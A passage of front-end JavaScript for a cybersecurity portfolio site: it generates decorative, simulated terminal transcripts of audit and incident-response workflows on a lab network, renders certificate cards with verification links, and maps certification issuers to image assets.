          `[doc]   ${name.toLowerCase().replace(/\s+/g, '-')} [options] <args>`,
          '$ # Step 1: identify version',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} --version`,
          `[ok] ${name} v1.0.2 (installed)`,
          '$ # Step 2: run basic operation with help',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} --help`,
          '[ok] available subcommands: list, show, test, scan',
          '$ # Step 3: execute a basic test',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} test --dry-run`,
          '[ok] dry-run completed — no side effects',
          '$ # Read documentation before moving to intermediate workflows.'
        ]
      };
    }
    if (lvl === 'intermediate') {
      return {
        intro: `Typical daily workflow using <strong>${escapeHtmlS(name)}</strong> — independent troubleshooting in a production-like environment.`,
        lines: [
          `$ # ${name} — daily workflow @ ${t}`,
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} status`,
          `[ok] service healthy | uptime 14d | 2 active sessions`,
          '$ # Identify target',
          '$ TARGET=192.168.56.103',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} inspect $TARGET`,
          '[*] inspecting target...',
          `[ok] reachable | latency 4.2ms | fingerprint: linux 5.x`,
          '$ # Run standard checks',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} check --verbose $TARGET`,
          '[*] running 6 checks...',
          '[ok] config_baseline    PASS',
          '[ok] auth_mechanism      PASS',
          '[warn] tls_version       TLSv1.2 (consider TLSv1.3)',
          '[ok] log_level           PASS',
          '[ok] timeout_policy      PASS',
          '[warn] default_credentials  review recommended',
          '$ # Investigate warning',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} trace --filter warn $TARGET`,
          '[*] warning traced to config file /etc/default/cfg',
          '[ok] remediation suggestion logged in /tmp/findings.log',
          '$ # Workflow complete — 2 warnings, 0 critical'
        ]
      };
    }
    if (lvl === 'advanced') {
      return {
        intro: `Advanced scenario with <strong>${escapeHtmlS(name)}</strong> — multi-step investigation ending in findings and a remediation proposal.`,
        lines: [
          `$ # ${name} — advanced investigation @ ${t}`,
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} --batch --target 192.168.56.0/24`,
          '[*] mapping target range (256 addresses)...',
          '[+] 12 hosts up | 4 listening on the relevant port',
          '$ # Deep inspection of the 4 candidates',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} probe --deep --targets 192.168.56.103,192.168.56.110,192.168.56.115,192.168.56.121`,
          '[*] probing...',
          '[!] 192.168.56.103 — anomalous response pattern detected',
          '[!] 192.168.56.110 — unexpected service on port 7547',
          '$ # Correlate with logs',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} logs --since 24h --grep "192.168.56.103"`,
          '[+] 47 matching events in the last 24h',
          '[!] beacon pattern every 60.0s — likely C2 channel',
          '$ # Capture evidence',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} capture --host 192.168.56.103 --out /tmp/evidence.pcap`,
          '[ok] evidence saved (47 KB) | hash sha256=4f8c...e201',
          '$ # Generate findings report',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} report --out /tmp/findings.md`,
          '[ok] report generated:',
          '[ok]   - 1 CRITICAL: C2 beacon on 192.168.56.103:443',
          '[ok]   - 1 HIGH:     unexpected service on .110:7547',
          '[ok]   - 2 MEDIUM:  TLS misconfig, weak ciphers',
          '$ # Recommended remediation:',
          '$ #   1. Isolate 192.168.56.103 from the LAN',
          '$ #   2. Block outbound 443 to attacker IP at the perimeter',
          '$ #   3. Reset credentials on the affected host',
          '$ #   4. Re-image + re-deploy with hardened baseline'
        ]
      };
    }
    if (lvl === 'expert') {
      return {
        intro: `Expert-level scenario with <strong>${escapeHtmlS(name)}</strong> — novel situation requiring standards-setting decisions and peer review.`,
        lines: [
          `$ # ${name} — expert scenario @ ${t}`,
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} --audit --strict --target enterprise-lab`,
          '[*] running 247 audit controls across 18 systems...',
          '[ok] 184 PASS | 38 WARN | 21 FAIL | 4 UNKNOWN',
          '$ # Triage the 21 failures',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} failures --group-by control-family`,
          '[!] Access Control (AC):    7 failures',
          '[!] Audit & Accountability: 5 failures',
          '[!] Configuration Mgmt:     6 failures',
          '[!] Identification & Auth:  3 failures',
          '$ # Root-cause analysis on the AC cluster',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} root-cause --family AC --depth 4`,
          '[*] tracing dependency graph...',
          '[!] shared root cause: orphaned accounts from 2 legacy services',
          '[!] recommendation: implement automated deprovisioning via SCIM',
          '$ # Architect the fix',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} plan --fix orphaned-accounts --strategy scim-automation`,
          '[ok] remediation plan:',
          '[ok]   - Phase 1: integrate SCIM provider (2 sprints)',
          '[ok]   - Phase 2: dry-run reconciliation (1 sprint)',
          '[ok]   - Phase 3: cutover + monitor (2 sprints)',
          '$ # Document the new standard for the team',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} doc --out docs/standards/orphaned-accounts.md`,
          '[ok] standard drafted — submit for peer review',
          '$ # Schedule the peer review session',
          '$ # Mentor note: walk 2 engineers through this scenario next week'
        ]
      };
    }
    return { intro: `Simulation for ${escapeHtmlS(name)}.`, lines: [`$ # ${name}`] };
  }

  // =========================================================================
  //  CERT VIEW — shown when a cert card is clicked.
  //  Displays: full cert picture + description + issuer/date + VERIFY button
  //  VERIFY button is the ONLY external navigation.
  // =========================================================================
  function certViewSim(cert, host) {
    const issuerLogo = issuerLogoForCert(cert);
    const issuerC = issuerCertif(cert);
    host.innerHTML = `
      <div class="cert-view-grid">
        <div class="cert-view-image-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">certificate_image</span>
            <span class="skill-modal-lvl" style="border-color:var(--neon-3);color:var(--neon-3)">VERIFIED</span>
          </div>
          <div class="cert-image-frame">
            <img src="${issuerC}" alt="${escapeHtmlS(cert.title)} certificate image" loading="lazy" />
            <div class="cert-image-corner ctc-tl"></div>
            <div class="cert-image-corner ctc-tr"></div>
            <div class="cert-image-corner ctc-bl"></div>
            <div class="cert-image-corner ctc-br"></div>
          </div>
        </div>
        <div class="cert-view-info-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">${escapeHtmlS(cert.title)}</span>
          </div>
          <div class="cert-view-issuer-row">
            <img src="${issuerLogo}" alt="${escapeHtmlS(cert.issuer)} logo" class="cert-view-issuer-logo" loading="lazy" />
            <div>
              <div class="cv-issuer-name">${escapeHtmlS(cert.issuer)}</div>
              <div class="cv-issue-date">Issued: ${escapeHtmlS(cert.date)}</div>
            </div>
          </div>
          <div class="cert-view-desc">
            <div class="cvd-label">// DESCRIPTION</div>
            <p class="cvd-text">${escapeHtmlS(cert.blurb || 'No description available for this certification.')}</p>
          </div>
          <div class="cert-view-meta">
            <div class="cvm-row">
              <span class="cvm-key">RECIPIENT</span>
              <span class="cvm-val">Souhaieb Marzouk</span>
            </div>
            <div class="cvm-row">
              <span class="cvm-key">ISSUE_DATE</span>
              <span class="cvm-val">${escapeHtmlS(cert.date)}</span>
            </div>
            <div class="cvm-row">
              <span class="cvm-key">ISSUING_BODY</span>
              <span class="cvm-val">${escapeHtmlS(cert.issuer)}</span>
            </div>
            <div class="cvm-row">
              <span class="cvm-key">VERIFY_URL</span>
              <span class="cvm-val" style="word-break:break-all;font-size:10px">${escapeHtmlS(cert.verifyUrl || '—')}</span>
            </div>
          </div>
          <a class="cert-view-verify-btn" href="${escapeHtmlS(cert.verifyUrl || '#')}" target="_blank" rel="noopener noreferrer">
            <span>VERIFY_CERTIFICATE</span>
            <span class="arrow">↗</span>
          </a>
          <div class="sim-p" style="margin-top:10px;font-size:10px;color:var(--fg-dim);line-height:1.5">
            // External verification link opens in a new tab.
          </div>
        </div>
      </div>
    `;
  }

  function issuerLogoForCert(cert) {
    const m = {
      htb:       'assets/issuer-logos/HTB-Logo.png',
      comptia:   'assets/issuer-logos/Comptia-Logo.png',
      tryhackme: 'assets/issuer-logos/THM-Logo.jpg',
      google:    'assets/issuer-logos/Google-Logo.png',
      atsqa:     'assets/issuer-logos/ATSQA-Logo.jpeg'
    };
    if (cert.issuerKey && m[cert.issuerKey]) return m[cert.issuerKey];
    const byName = {
      'HackTheBox':       'assets/issuer-logos/HTB-Logo.png',
      'CompTIA':          'assets/issuer-logos/Comptia-Logo.png',
      'TryHackMe':        'assets/issuer-logos/THM-Logo.jpg',
      'Google / Coursera':'assets/issuer-logos/Google-Logo.png',
      'AT*SQA':           'assets/issuer-logos/ATSQA-Logo.jpeg'
    };
    return byName[cert.issuer] || 'assets/issuer-logos/Google-Logo.png';
  }
  function issuerCertif(cert) {
    const m = {
      htb:       'assets/certificates/HTB-CDSA.png',
      compnet:   'assets/certificates/Network+.png',
      compsec:   'assets/certificates/Security+.png',
      thm101: 'assets/certificates/Cyber-Security-101.png',
      thmjrpentest: 'assets/certificates/Jr-PenTester.png',
      thmsocl1: 'assets/certificates/SOC-L1.png',
      thmsocl2: 'assets/certificates/SOC-L2.png',
      google:    'assets/certificates/Google-Cybersecurity.png',
      ctfl:     'assets/certificates/CTFL.png',
      ctflat:     'assets/certificates/CTFL-AT.png'
    };
    if (cert.issuerKey && m[cert.issuerKey]) return m[cert.issuerKey];
    const byName = {
	  'HTB Certified Defensive Security Analyst (CDSA)':	'assets/certificates/HTB-CDSA.png',
      'CompTIA Network+ (N10-009)':	'assets/certificates/Network+.png',
      'CompTIA Security+ (SY0-701)':	'assets/certificates/Security+.png',
      'Cyber Security 101':	'assets/certificates/Cyber-Security-101.png',
      'Jr Penetration Tester':	'assets/certificates/Jr-PenTester.png',
      'SOC Level 1':	'assets/certificates/SOC-L1.png',
      'SOC Level 2':	'assets/certificates/SOC-L2.png',
      'Google Cybersecurity Professional Certificate':	'assets/certificates/Google-Cybersecurity.png',
      'ISTQB Certified Tester Foundation Level (CTFL)':	'assets/certificates/CTFL.png',
      'ISTQB Certified Tester Foundation Level — Agile Tester (CTFL-AT)':	'assets/certificates/CTFL-AT.png'
    };
    return byName[cert.title] || 'assets/certificates/Google-Logo.png';
  }

  /* =================================================================
   *  PUBLIC API
   * ================================================================= */
  window.SIMULATIONS = {
    render: function (key, host, ctx) {
      // cleanup previous
      if (host.__cleanup) { host.__cleanup(); host.__cleanup = null; }
      ctx = ctx || {};
      ctx.tabs = ctx.tabs || [];

      // 1. CERT VIEW — clicking a certification card
      if (key === '__cert_view__' && ctx.cert) {
        certViewSim(ctx.cert, host);
        return;
      }

      // 2. SKILL SIM — always produce 3 tabs (sources / radar / live-sim)
      if (ctx.skill) {
        const skill = ctx.skill;
        const liveRenderer = (typeof key === 'string' && SKILL_SIMS[key]) ? SKILL_SIMS[key] : genericLiveSim;

        // push 3 tabs
        ctx.tabs.push(
          { id: 'sources',  label: '// SOURCES' },
          { id: 'radar',    label: '// PROFICIENCY' },
          { id: 'live-sim', label: '// LIVE SIMULATION' }
        );

        // build 3 sections; live-sim section will be filled by the renderer
        host.innerHTML = `
          <div class="sim-section active" data-sim="sources">
            ${renderSourcesSection(skill)}
          </div>
          <div class="sim-section" data-sim="radar">
            ${renderRadarSection(skill)}
          </div>
          <div class="sim-section" data-sim="live-sim">
            <!-- live sim renderer fills this in -->
          </div>
        `;

        const liveHost = host.querySelector('[data-sim="live-sim"]');
        if (liveHost) {
          // Specific skill sims take only (host); genericLiveSim takes (skill, host)
          if (liveRenderer === genericLiveSim) {
            genericLiveSim(skill, liveHost);
          } else {
            liveRenderer(liveHost);
          }
        }
        return;
      }

      // 3. EXPERIENCE / PROJECT simulations
      if (SIMS[key]) {
        SIMS[key](host, ctx);
        return;
      }

      host.innerHTML = `<div class="sim-p">Simulation not configured for this entry. Add a renderer in <span class="code-inline">simulations.js</span> for key <span class="code-inline">${key}</span>.</div>`;
    }
  };

})();
